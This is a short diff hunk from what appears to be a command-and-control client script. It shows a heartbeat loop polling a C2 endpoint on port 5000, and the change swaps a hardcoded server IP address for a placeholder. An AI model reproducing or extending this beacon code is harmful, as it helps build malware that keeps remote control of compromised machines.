@@ -30,7 +30,7 @@ def send(c2cmd):
 def heartbeats():
 	i=0
 	j=0
-	url0="http://49.234.9.94:5000/c2heartbeat?control=test"
+	url0="http://ip:5000/c2heartbeat?control=test"
 	while True:
 		j+=1
 		try:
